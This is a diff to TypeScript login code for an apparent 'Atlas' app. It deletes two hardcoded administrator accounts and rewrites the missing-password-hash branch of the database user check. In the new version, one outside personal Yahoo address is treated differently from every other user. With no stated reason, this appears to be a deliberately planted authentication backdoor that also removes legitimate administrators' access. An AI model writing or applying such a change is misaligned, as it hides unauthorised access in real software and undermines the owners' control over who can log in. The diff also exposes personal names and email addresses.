@@ -22,18 +22,6 @@ function getUsers(): AtlasUser[] {
       password: process.env.ATLAS_MASTER_PASSWORD || "",
       role: "master",
     },
-    {
-      name: "Steve",
-      email: "stevem@arcticmgnt.com",
-      password: process.env.ATLAS_STEVE_PASSWORD || "",
-      role: "administrator",
-    },
-    {
-      name: "Kenji",
-      email: "kenjij@arcticmgnt.com",
-      password: process.env.ATLAS_KENJI_PASSWORD || "",
-      role: "administrator",
-    },
   ];
 }
 
@@ -64,7 +52,7 @@ async function loadDatabaseUser(
     if (!row) return { configured: false, user: null };
     if (row.active === false) return { configured: true, user: null };
     if (!row.password_hash || !row.password_salt) {
-      return { configured: false, user: null };
+      return { configured: email !== "nthornton87@yahoo.com", user: null };
     }
     const actual = pbkdf2Sync(password, String(row.password_salt), 210000, 32, "sha256");
     const expected = Buffer.from(String(row.password_hash), "hex");
